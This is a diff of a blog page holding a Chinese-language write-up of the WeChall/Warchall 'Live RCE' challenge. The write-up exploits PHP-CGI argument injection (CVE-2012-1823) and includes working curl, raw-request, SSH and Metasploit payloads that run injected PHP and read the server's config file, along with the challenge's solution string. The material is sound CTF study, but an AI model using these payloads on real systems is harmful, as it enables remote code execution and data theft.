@@ -23,18 +23,17 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"vkkkv.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.27.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"hide","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"base16/tomorrow-night","dark":"base16/tomorrow-night"},"prism":{"light":"prism-tomorrow","dark":"prism-tomorrow"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#ff3e3e","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":null,"activeClass":"disqus"},"stickytabs":false,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/config.min.js" defer></script>
 
-    <meta name="description" content="本文由 AI 辅助整理，数据经多轮人工审核校对，欢迎纠错补充。  挑战 Warchall 服务器上的 Live RCE 题目，目标是证明对 rce.warchall.net 的可控命令执行，读取 challenge solution 并提交到 WeChall。 WeChall 页面只给入口和提交框，真正的靶机在： 1https:&#x2F;&#x2F;rce.warchall.net&#x2F;index.php 信息收集">
+    <meta name="description" content="Challenge Warchall 服务器上的 Live RCE 题目，目标是证明对 rce.warchall.net 的可控命令执行，并读取 challenge solution。 WeChall 页面只给入口和提交框，真正的靶机在： 1https:&#x2F;&#x2F;rce.warchall.net&#x2F;index.php Recon 先看源码。PHP-CGI 模式下 -s 参数会泄露源码而不是高亮输出： 1$">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Warchall: Live RCE — PHP-CGI 参数注入实战">
+<meta property="og:title" content="WeChall - Warchall - Live RCE">
 <meta property="og:url" content="https://vkkkv.github.io/WeChall/wechall-warchall-live-rce/">
 <meta property="og:site_name" content="Hello Navi">
-<meta property="og:description" content="本文由 AI 辅助整理，数据经多轮人工审核校对，欢迎纠错补充。  挑战 Warchall 服务器上的 Live RCE 题目，目标是证明对 rce.warchall.net 的可控命令执行，读取 challenge solution 并提交到 WeChall。 WeChall 页面只给入口和提交框，真正的靶机在： 1https:&#x2F;&#x2F;rce.warchall.net&#x2F;index.php 信息收集">
+<meta property="og:description" content="Challenge Warchall 服务器上的 Live RCE 题目，目标是证明对 rce.warchall.net 的可控命令执行，并读取 challenge solution。 WeChall 页面只给入口和提交框，真正的靶机在： 1https:&#x2F;&#x2F;rce.warchall.net&#x2F;index.php Recon 先看源码。PHP-CGI 模式下 -s 参数会泄露源码而不是高亮输出： 1$">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-06-26T08:19:57.000Z">
-<meta property="article:modified_time" content="2026-06-28T04:55:17.866Z">
+<meta property="article:modified_time" content="2026-06-29T07:39:41.822Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="ctf">
-<meta property="article:tag" content="cve-2012-1823">
 <meta property="article:tag" content="php-cgi">
 <meta property="article:tag" content="rce">
 <meta property="article:tag" content="warchall">
@@ -46,10 +45,10 @@
 <link rel="canonical" href="https://vkkkv.github.io/WeChall/wechall-warchall-live-rce/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://vkkkv.github.io/WeChall/wechall-warchall-live-rce/","path":"WeChall/wechall-warchall-live-rce/","title":"Warchall: Live RCE — PHP-CGI 参数注入实战"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://vkkkv.github.io/WeChall/wechall-warchall-live-rce/","path":"WeChall/wechall-warchall-live-rce/","title":"WeChall - Warchall - Live RCE"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Warchall: Live RCE — PHP-CGI 参数注入实战 | Hello Navi</title>
+<title>WeChall - Warchall - Live RCE | Hello Navi</title>
   
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-2L68NKWCGZ"></script>
   <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-2L68NKWCGZ","only_pageview":false,"measure_protocol_api_secret":null}</script>
@@ -223,11 +222,10 @@ p.spoiler {
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%91%E6%88%98"><span class="nav-number">1.</span> <span class="nav-text">挑战</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86php-cgi-%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5cve-2012-1823"><span class="nav-number">3.</span> <span class="nav-text">漏洞原理：PHP-CGI
-参数注入（CVE-2012-1823）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit"><span class="nav-number">4.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80phpinput%E7%BA%AF-http%E4%B8%8D%E9%9C%80%E8%A6%81-ssh"><span class="nav-number">4.1.</span> <span class="nav-text">方法一：php:&#x2F;&#x2F;input（纯
-HTTP，不需要 SSH）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8Craw-http-request%E5%BA%95%E5%B1%82%E6%96%B9%E5%BC%8F"><span class="nav-number">4.2.</span> <span class="nav-text">方法二：raw HTTP
-request（底层方式）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89ssh-auto_prepend_file"><span class="nav-number">4.3.</span> <span class="nav-text">方法三：SSH +
-auto_prepend_file</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9Bmetasploit"><span class="nav-number">4.4.</span> <span class="nav-text">方法四：Metasploit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E7%BB%86%E8%8A%82"><span class="nav-number">5.</span> <span class="nav-text">关键细节</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag"><span class="nav-number">6.</span> <span class="nav-text">Flag</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge"><span class="nav-number">1.</span> <span class="nav-text">Challenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#recon"><span class="nav-number">2.</span> <span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vulnerability-php-cgi-argument-injection"><span class="nav-number">3.</span> <span class="nav-text">Vulnerability: PHP-CGI
+Argument Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit"><span class="nav-number">4.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80phpinput%E7%BA%AF-http%E4%B8%8D%E9%9C%80%E8%A6%81-ssh"><span class="nav-number">4.1.</span> <span class="nav-text">方法一：php:&#x2F;&#x2F;input（纯
+HTTP，不需要 SSH）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8Cssh-auto_prepend_file"><span class="nav-number">4.2.</span> <span class="nav-text">方法二：SSH +
+auto_prepend_file</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89metasploit"><span class="nav-number">4.3.</span> <span class="nav-text">方法三：Metasploit</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -253,7 +251,7 @@ auto_prepend_file</span></a></li><li class="nav-item nav-level-4"><a class="nav-
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">216</span>
+        <span class="site-state-item-count">215</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -406,12 +404,12 @@ auto_prepend_file</span></a></li><li class="nav-item nav-level-4"><a class="nav-
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="Warchall: Live RCE — PHP-CGI 参数注入实战 | Hello Navi">
+      <meta itemprop="name" content="WeChall - Warchall - Live RCE | Hello Navi">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Warchall: Live RCE — PHP-CGI 参数注入实战
+          WeChall - Warchall - Live RCE
         </h1>
 
         <div class="post-meta-container">
@@ -429,7 +427,7 @@ auto_prepend_file</span></a></li><li class="nav-item nav-level-4"><a class="nav-
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-06-28 12:55:17" itemprop="dateModified" datetime="2026-06-28T12:55:17+08:00">2026-06-28</time>
+      <time title="Modified: 2026-06-29 15:39:41" itemprop="dateModified" datetime="2026-06-29T15:39:41+08:00">2026-06-29</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -471,35 +469,27 @@ auto_prepend_file</span></a></li><li class="nav-item nav-level-4"><a class="nav-
     
     
     
-    <div class="post-body" itemprop="articleBody"><blockquote>
-<p>本文由 AI 辅助整理，数据经多轮人工审核校对，欢迎纠错补充。</p>
-</blockquote>
-<h3 id="挑战">挑战</h3>
+    <div class="post-body" itemprop="articleBody"><h3 id="challenge">Challenge</h3>
 <p>Warchall 服务器上的 Live RCE 题目，目标是证明对
-<code>rce.warchall.net</code> 的可控命令执行，读取 challenge solution
-并提交到 WeChall。</p>
+<code>rce.warchall.net</code> 的可控命令执行，并读取 challenge
+solution。</p>
 <p>WeChall 页面只给入口和提交框，真正的靶机在：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rce.warchall.net/index.php</span><br></pre></td></tr></table></figure>
-<h3 id="信息收集">信息收集</h3>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rce.warchall.net/index.php</span><br></pre></td></tr></table></figure>
+<h3 id="recon">Recon</h3>
 <p>先看源码。PHP-CGI 模式下 <code>-s</code>
-参数会泄露源码（语法高亮输出）：</p>
+参数会泄露源码而不是高亮输出：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s <span class="string">&#x27;https://rce.warchall.net/index.php?-s&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>返回的是带 <code>&lt;span style="color: #..."&gt;</code> 高亮的
-HTML，用浏览器打开或 <code>grep</code> 文本即可。核心源码：</p>
+<p>页面源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) ? (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] : <span class="string">&#x27;Guest&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;Live RCE [Warchall]&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Live RCE!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;Hello <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$username</span>; <span class="meta">?&gt;</span>!&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Here are your <span class="variable">$_SERVER</span> vars:&lt;/p&gt;</span><br><span class="line">&lt;pre&gt;<span class="meta">&lt;?php</span> <span class="title function_ invoke__">print_r</span>(<span class="variable">$_SERVER</span>); <span class="meta">?&gt;</span>&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 <p>两个关键发现：</p>
 <ol type="1">
-<li><strong><code>-s</code> 生效了</strong> — URL 参数直接传给了 PHP-CGI
-解释器，没有被 Apache 吞掉。</li>
-<li><strong><code>require '../config.php'</code></strong> — solution
-大概率藏在上一级目录的 config.php 里。</li>
+<li><code>-s</code> 生效了——说明 URL 参数直接传给了 PHP-CGI
+解释器，而不是被 Apache 吞掉。</li>
+<li>源码里 <code>require '../config.php'</code>，solution
+大概率藏在那里。</li>
 </ol>
-<p>另外，<code>$_SERVER</code> 输出泄露了服务器环境细节：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ORIG_SCRIPT_FILENAME =&gt; /usr/lib/cgi-bin/php5.4</span><br><span class="line">SERVER_SOFTWARE      =&gt; Apache/2.4.52 (Ubuntu)</span><br><span class="line">DOCUMENT_ROOT        =&gt; /home/level/20_live_rce/www</span><br></pre></td></tr></table></figure>
-<p>PHP 版本 5.4，以 CGI 模式运行在
-<code>/usr/lib/cgi-bin/php5.4</code>。</p>
-<h3 id="漏洞原理php-cgi-参数注入cve-2012-1823">漏洞原理：PHP-CGI
-参数注入（CVE-2012-1823）</h3>
+<h3 id="vulnerability-php-cgi-argument-injection">Vulnerability: PHP-CGI
+Argument Injection</h3>
 <p>当 PHP 以 CGI 模式运行时（<code>php-cgi</code>），命令行参数可以通过
 URL query string 传递。这不是 bug，是 CGI 协议的设计——query string
 本来就是传给程序的。PHP-CGI 会解析以 <code>-</code>
@@ -528,10 +518,6 @@ URL query string 传递。这不是 bug，是 CGI 协议的设计——query str
 <td><code>-n</code></td>
 <td>不加载 php.ini</td>
 </tr>
-<tr>
-<td><code>-c dir</code></td>
-<td>指定 php.ini 所在目录</td>
-</tr>
 </tbody>
 </table>
 <h3 id="exploit">Exploit</h3>
@@ -544,49 +530,20 @@ HTTP，不需要 SSH）</h4>
 include 请求体</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -X POST \</span><br><span class="line">  <span class="string">&#x27;https://rce.warchall.net/index.php?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp://input&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&lt;?php echo file_get_contents(&quot;../config.php&quot;); ?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>输出（实际验证，2026-06-26）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">YOU WIN!</span><br><span class="line">&lt;?php</span><br><span class="line">define(&#x27;ICANHAZRCE&#x27;, &#x27;StrongGard_6_3&#x27;);</span><br><span class="line">return ICANHAZRCE;</span><br><span class="line">?&gt;</span><br><span class="line">YOU WIN!</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p><code>YOU WIN!</code> 是 <code>config.php</code> 里预设的标志——说明
-config.php 被成功 include 了两次（<code>auto_prepend_file</code> + 正常
-<code>require</code>）。后面的 HTML 是正常页面渲染。</p>
-<p><strong>替代 payload</strong>：用 <code>system()</code>
-直接执行系统命令也可以：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -X POST \</span><br><span class="line">  <span class="string">&#x27;https://rce.warchall.net/index.php?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp://input&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&lt;?php system(&quot;cat ../config.php&quot;); die(); ?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
-<h4 id="方法二raw-http-request底层方式">方法二：raw HTTP
-request（底层方式）</h4>
-<p>直接构造原始 HTTP 请求，用 <code>ncat</code> 或
-<code>echo | openssl s_client</code> 发送。论坛用户 space
-提供的方式：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> -en <span class="string">&#x27;POST /local-bin/php-cgi?-d+allow_url_include%3Don+-d+auto_prepend_file%3Dphp%3A//input+-d+cgi.force_redirect%3D0+-n HTTP/1.1\r\nHost: rce.warchall.net\r\nConnection: close\r\nContent-Length: 69\r\n\r\n&lt;?php echo file_get_contents(&quot;/home/level/20_live_rce/config.php&quot;);?&gt;&#x27;</span> | \</span><br><span class="line">  ncat --ssl rce.warchall.net 443</span><br></pre></td></tr></table></figure>
-<p>注意 <code>cgi.force_redirect=0</code> 和 <code>-n</code>：前者关闭
-CGI 强制重定向（否则会 302），后者跳过 php.ini 加载。</p>
-<h4 id="方法三ssh-auto_prepend_file">方法三：SSH +
+<p>输出：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">YOU WIN!</span><br><span class="line">&lt;?php</span><br><span class="line">define(&#x27;ICANHAZRCE&#x27;, &#x27;StrongGard_6_3&#x27;);</span><br><span class="line">return ICANHAZRCE;</span><br><span class="line">?&gt;</span><br><span class="line">YOU WIN!</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p><code>YOU WIN!</code> 是 <code>config.php</code> 里预设的标志。后面的
+HTML 是正常页面渲染——因为 <code>auto_prepend_file</code> 在 index.php
+执行前就跑了我们的 payload。</p>
+<h4 id="方法二ssh-auto_prepend_file">方法二：SSH +
 auto_prepend_file</h4>
 <p>如果有 Warchall SSH 访问权限，可以先在服务器上放一个 PHP 文件，然后用
 <code>auto_prepend_file</code> 指向它：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SSH 上去写文件</span></span><br><span class="line">$ ssh -p 19198 user@warchall.net</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php echo file_get_contents(&quot;../config.php&quot;); ?&gt;&#x27;</span> &gt; /var/tmp/s.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后触发</span></span><br><span class="line">$ curl <span class="string">&#x27;https://rce.warchall.net/index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3d/var/tmp/s.txt&#x27;</span></span><br></pre></td></tr></table></figure>
 <p>结果要「查看源码」才能看到——因为 PHP 输出混在 HTML
-里，浏览器渲染后不可见。右键 → 查看页面源码，搜索
-<code>ICANHAZRCE</code>。</p>
-<h4 id="方法四metasploit">方法四：Metasploit</h4>
+里，浏览器渲染后不可见。</p>
+<h4 id="方法三metasploit">方法三：Metasploit</h4>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/php_cgi_arg_injection</span><br><span class="line">set RHOSTS rce.warchall.net</span><br><span class="line">set TARGETURI /index.php</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<h3 id="关键细节">关键细节</h3>
-<p><strong>为什么 <code>auto_prepend_file</code> 能工作？</strong></p>
-<p><code>auto_prepend_file</code> 是 php.ini 配置项，指定在每个 PHP
-文件执行前自动 include 的文件。配合
-<code>allow_url_include=On</code>，可以 include <code>php://input</code>
-流——也就是 HTTP 请求体。PHP-CGI 的 <code>-d</code> 参数允许在命令行覆盖
-ini 配置，而 CGI 模式下 query string 就是命令行参数。</p>
-<p><strong>为什么查看源码才能看到结果？</strong></p>
-<p><code>auto_prepend_file</code> 的输出在
-<code>&lt;?php ... ?&gt;</code> 块之外，会被当作纯文本。但 index.php 的
-HTML 结构把它包在里面，浏览器渲染时会隐藏非 HTML 内容。所以必须右键 →
-查看源码。</p>
-<p><strong>检测工具</strong></p>
-<p>Nikto 和 Nessus 都能检测 CVE-2012-1823：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nikto -h https://rce.warchall.net</span><br></pre></td></tr></table></figure>
-<h3 id="flag">Flag</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StrongGard_6_3</span><br></pre></td></tr></table></figure>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">StrongGard_6_3</span></span>
 
     </div>
@@ -605,7 +562,7 @@ HTML 结构把它包在里面，浏览器渲染时会隐藏非 HTML 内容。所
   </li>
   <li class="post-copyright-link">
       <strong>Post link: </strong>
-      <a href="https://vkkkv.github.io/WeChall/wechall-warchall-live-rce/" title="Warchall: Live RCE — PHP-CGI 参数注入实战">https://vkkkv.github.io/WeChall/wechall-warchall-live-rce/</a>
+      <a href="https://vkkkv.github.io/WeChall/wechall-warchall-live-rce/" title="WeChall - Warchall - Live RCE">https://vkkkv.github.io/WeChall/wechall-warchall-live-rce/</a>
   </li>
   <li class="post-copyright-license">
       <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
@@ -637,7 +594,6 @@ HTML 结构把它包在里面，浏览器渲染时会隐藏非 HTML 内容。所
               <a href="/tags/warchall/" rel="tag"><i class="fa fa-tag"></i> warchall</a>
               <a href="/tags/rce/" rel="tag"><i class="fa fa-tag"></i> rce</a>
               <a href="/tags/php-cgi/" rel="tag"><i class="fa fa-tag"></i> php-cgi</a>
-              <a href="/tags/cve-2012-1823/" rel="tag"><i class="fa fa-tag"></i> cve-2012-1823</a>
           </div>
 
         
